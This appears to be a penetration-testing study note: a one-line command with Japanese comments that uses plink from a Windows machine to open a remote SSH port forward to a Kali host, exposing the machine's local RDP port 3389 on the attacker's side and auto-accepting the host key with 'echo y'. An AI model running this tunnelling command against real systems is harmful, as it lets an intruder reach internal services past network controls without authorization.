```sh
# リモートポートフォワード
# -Rオプションの後に、Kali SSH サーバーで開きたいソケットと、パケットを転送したい端末のループバック インターフェイス上の RDP サーバー ポートを渡す
# 関係ないけど、echo yで予め入力を渡せる（linuxならecho y | のみでいい)
cmd.exe /c echo y | .\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.41.7
```